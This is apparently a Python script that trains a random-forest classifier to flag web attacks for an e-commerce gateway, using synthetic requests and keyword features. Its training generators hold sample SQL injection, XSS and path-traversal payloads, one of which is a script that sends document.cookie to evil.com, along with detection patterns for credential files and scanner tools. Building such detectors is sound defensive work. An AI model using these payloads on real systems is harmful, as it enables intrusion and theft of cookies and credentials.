#!/usr/bin/env python3
"""ShieldMart Intelligent Gateway — ML Threat Detection"""
import numpy as np
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import classification_report, accuracy_score, confusion_matrix
from sklearn.preprocessing import StandardScaler
from sklearn.pipeline import Pipeline
import joblib, json, os

THREAT_LABELS = {0: 'Normal', 1: 'SQL Injection', 2: 'XSS', 3: 'Path Traversal', 4: 'DDoS', 5: 'Brute Force'}

def extract_features(method, path, body, user_agent=''):
    body = str(body or '').lower()
    path = str(path or '/').lower()
    method = str(method or 'GET').upper()
    ua = str(user_agent or '').lower()

    return [
        # Basic metrics
        {'GET':0,'POST':1,'PUT':2,'DELETE':3,'PATCH':4,'OPTIONS':5,'HEAD':6}.get(method, 7),
        min(len(path), 500),
        min(len(body), 5000),
        path.count('/'),
        path.count('='),
        path.count('&'),
        body.count('='),
        body.count('&'),
        # SQL injection
        int('select' in body or 'select' in path),
        int('union' in body or 'union' in path),
        int('drop' in body or 'drop' in path),
        int('insert' in body),
        int('delete from' in body),
        int("or '1'='1" in body or '1=1' in body or "or 1=1" in body),
        int('--' in body or '/*' in body or '#' in body),
        int('xp_' in body or 'exec(' in body or 'execute(' in body),
        int('cast(' in body or 'convert(' in body),
        int('sleep(' in body or 'waitfor' in body or 'benchmark(' in body),
        int('information_schema' in body or 'sys.tables' in body),
        int('char(' in body or 'ascii(' in body or 'hex(' in body),
        body.count("'"),
        body.count('"'),
        body.count(';'),
        body.count('('),
        # XSS
        int('<script' in body),
        int('javascript:' in body),
        int('onerror=' in body or 'onload=' in body or 'onclick=' in body or 'onmouseover=' in body),
        int('alert(' in body),
        int('<img' in body and ('onerror' in body or 'src=' in body)),
        int('<svg' in body or '<iframe' in body),
        int('document.cookie' in body or 'document.write' in body),
        int('eval(' in body or 'expression(' in body),
        int('vbscript:' in body or 'data:text' in body),
        body.count('<'),
        body.count('>'),
        # Path traversal
        int('../' in path or '..\\' in path or '../' in body),
        int('etc/passwd' in path or 'etc/shadow' in path or 'etc/hosts' in path),
        int('cmd.exe' in path or '/bin/sh' in path or '/bin/bash' in path),
        int('/proc/' in path or '/sys/' in path),
        int('%2e%2e' in path or '..%2f' in path or '%252e' in path),
        int('../../../../' in path or '..../' in path),
        # DDoS patterns
        int(len(body) == 0 and method == 'POST'),
        int(path.count('/') > 8),
        int(len(path) > 200),
        # Brute force
        int('login' in path and method == 'POST'),
        int('auth' in path and method == 'POST'),
        int('password' in body and 'email' in body),
        int('admin' in path or 'administrator' in path),
        # Encoding
        int('%27' in path or '%22' in path or '%3c' in path or '%3e' in path),
        int('0x' in body and len(body) > 10),
        # User agent signals
        int('sqlmap' in ua or 'nikto' in ua or 'nmap' in ua),
        int('curl' in ua and method == 'POST'),
        int(len(ua) == 0),
        # Special chars ratio
        min(1.0, sum(1 for c in body if not c.isalnum() and c not in ' .,!?@-_:/\n\t') / max(len(body), 1)),
        min(1.0, sum(1 for c in path if not c.isalnum() and c not in '/-_.?=&') / max(len(path), 1)),
    ]

FEATURE_NAMES = [
    'method','path_len','body_len','path_depth','path_eq','path_amp','body_eq','body_amp',
    'sql_select','sql_union','sql_drop','sql_insert','sql_delete','sql_or11','sql_comment','sql_exec',
    'sql_cast','sql_timing','sql_schema','sql_char','quote_single','quote_double','semicolons','parens',
    'xss_script','xss_js','xss_events','xss_alert','xss_img','xss_svg','xss_cookie','xss_eval','xss_vbs',
    'angle_open','angle_close','pt_dotdot','pt_etc','pt_cmd','pt_proc','pt_encoded','pt_deep',
    'ddos_empty_post','ddos_deep_path','ddos_long_path',
    'bf_login','bf_auth','bf_password','bf_admin',
    'enc_percent','enc_hex','ua_scanner','ua_curl','ua_empty','body_special_ratio','path_special_ratio'
]

def gen_normal(n=1000):
    data = []
    endpoints = ['/api/products','/api/products?category=Electronics','/api/cart','/api/orders',
                 '/api/auth/me','/api/categories','/api/wishlist','/api/notifications','/health',
                 '/api/products?sort=rating&limit=20','/api/products?min_price=100&max_price=5000']
    bodies = ['','{"email":"user@example.com","password":"pass123"}','{"product_id":"abc123","quantity":2}',
              '{"name":"John","phone":"9876543210"}','{"rating":5,"body":"Great product!"}',
              '{"code":"SHIELD10","order_total":5000}','{"query":"sony headphones"}']
    methods = ['GET','GET','GET','POST','PUT','DELETE','GET','GET','POST','GET']
    import random
    for _ in range(n):
        ep = random.choice(endpoints)
        m = random.choice(methods)
        b = random.choice(bodies) if m in ['POST','PUT'] else ''
        data.append(extract_features(m, ep, b) + [0])
    return data

def gen_sql(n=400):
    data = []
    attacks = [
        ('POST','/api/auth/login','{"email":"admin\' OR \'1\'=\'1","password":"x"}'),
        ('GET','/api/products?id=1 UNION SELECT username,password FROM users--',''),
        ('POST','/api/search','{"query":"SELECT * FROM users WHERE 1=1--"}'),
        ('POST','/api/auth/login','{"email":"test\'; DROP TABLE users;--","password":"x"}'),
        ('GET',"/api/products?sort=1;DELETE FROM products--",''),
        ('POST','/api/reviews','{"body":"test\' UNION SELECT password FROM users--"}'),
        ('GET',"/api/products?id=1 AND SLEEP(5)--",''),
        ('POST','/api/auth/login','{"email":"x\' OR 1=1 --","password":"x"}'),
        ('GET','/api/products?name=\' OR \'\'=\'',''),
        ('POST','/api/cart','{"product_id":"1\' UNION SELECT * FROM users--","quantity":1}'),
        ('POST','/api/search','{"q":"1\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"}'),
        ('GET','/api/products?id=1;EXEC xp_cmdshell(\'dir\')--',''),
        ('POST','/api/auth/login','{"email":"admin\'--","password":"anything"}'),
        ('GET','/api/products?category=\' OR 1=1;--',''),
        ('POST','/api/orders','{"shipping_address":{"name":"1\' OR \'1\'=\'1"},"payment_method":"cod"}'),
    ]
    import random
    for _ in range(n):
        m,p,b = random.choice(attacks)
        data.append(extract_features(m, p, b) + [1])
    return data

def gen_xss(n=300):
    data = []
    attacks = [
        ('POST','/api/reviews','{"body":"<script>alert(document.cookie)</script>"}'),
        ('POST','/api/auth/register','{"name":"<img src=x onerror=alert(1)>","email":"x@x.com","password":"pass"}'),
        ('POST','/api/search','{"query":"<script>fetch(\'https://evil.com?c=\'+document.cookie)</script>"}'),
        ('POST','/api/reviews','{"title":"<svg onload=alert(\'xss\')>"}'),
        ('POST','/api/products','{"name":"<iframe src=javascript:alert(1)>"}'),
        ('POST','/api/reviews','{"body":"<img src=\\"x\\" onerror=\\"alert(1)\\">"}'),
        ('POST','/api/auth/login','{"email":"<script>alert(1)</script>","password":"pass"}'),
        ('POST','/api/reviews','{"body":"<div onmouseover=alert(1)>hover</div>"}'),
        ('POST','/api/search','{"q":"javascript:void(document.cookie)"}'),
        ('POST','/api/reviews','{"body":"<body onload=alert(1)>"}'),
    ]
    import random
    for _ in range(n):
        m,p,b = random.choice(attacks)
        data.append(extract_features(m, p, b) + [2])
    return data

def gen_traversal(n=300):
    data = []
    attacks = [
        ('GET','/api/../../../etc/passwd',''),
        ('GET','/api/files?path=../../../etc/shadow',''),
        ('GET','/api/download?file=../../../../windows/system32/cmd.exe',''),
        ('GET','/api/../../proc/self/environ',''),
        ('GET','/api/files?name=..%2F..%2F..%2Fetc%2Fpasswd',''),
        ('GET','/api/read?file=/etc/hosts',''),
        ('GET','/api/exec?cmd=/bin/bash+-c+id',''),
        ('GET','/api/files?path=....//....//etc/passwd',''),
        ('POST','/api/upload','{"path":"../../../etc/cron.d/malicious"}'),
        ('GET','/api/%2e%2e/%2e%2e/etc/passwd',''),
    ]
    import random
    for _ in range(n):
        m,p,b = random.choice(attacks)
        data.append(extract_features(m, p, b) + [3])
    return data

def gen_ddos(n=200):
    data = []
    import random
    endpoints = ['/api/products','/api/health','/api/categories']
    for _ in range(n):
        data.append(extract_features('GET', random.choice(endpoints), '') + [4])
    return data

def gen_bruteforce(n=200):
    data = []
    import random
    passwords = ['password','123456','admin','root','test','user','pass','letmein','welcome','monkey']
    emails = ['admin@test.com','root@test.com','user@test.com','test@test.com']
    for _ in range(n):
        b = json.dumps({'email': random.choice(emails), 'password': random.choice(passwords)})
        data.append(extract_features('POST', '/api/auth/login', b) + [5])
    return data

print("Generating dataset...")
dataset = (gen_normal(1000) + gen_sql(400) + gen_xss(300) + gen_traversal(300) + gen_ddos(200) + gen_bruteforce(200))
import numpy as np
dataset = np.array(dataset)
X, y = dataset[:, :-1], dataset[:, -1].astype(int)
print(f"Dataset: {X.shape[0]} samples, {X.shape[1]} features")
print(f"Classes: {dict(zip(*np.unique(y, return_counts=True)))}")

X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42, stratify=y)

print("\nTraining Random Forest...")
model = Pipeline([
    ('scaler', StandardScaler()),
    ('clf', RandomForestClassifier(n_estimators=300, max_depth=20, min_samples_split=3,
                                    min_samples_leaf=1, class_weight='balanced',
                                    random_state=42, n_jobs=-1))
])
model.fit(X_train, y_train)
y_pred = model.predict(X_test)
acc = accuracy_score(y_test, y_pred)
cv = cross_val_score(model, X, y, cv=5, scoring='accuracy')

print(f"\nAccuracy: {acc*100:.2f}%")
print(f"CV: {cv.mean()*100:.2f}% ± {cv.std()*100:.2f}%")
print(classification_report(y_test, y_pred, target_names=list(THREAT_LABELS.values())))

os.makedirs('ml_model', exist_ok=True)
joblib.dump(model, 'ml_model/threat_model.pkl')

metrics = {
    'accuracy': round(acc*100, 2),
    'cv_mean': round(cv.mean()*100, 2),
    'cv_std': round(cv.std()*100, 2),
    'n_samples': len(X),
    'n_features': X.shape[1],
    'feature_names': FEATURE_NAMES,
    'threat_labels': THREAT_LABELS,
    'classes': list(THREAT_LABELS.values()),
    'report': classification_report(y_test, y_pred, target_names=list(THREAT_LABELS.values()), output_dict=True)
}
with open('ml_model/metrics.json', 'w') as f:
    json.dump(metrics, f, indent=2)

print("\nModel saved: ml_model/threat_model.pkl")
print("Metrics saved: ml_model/metrics.json")
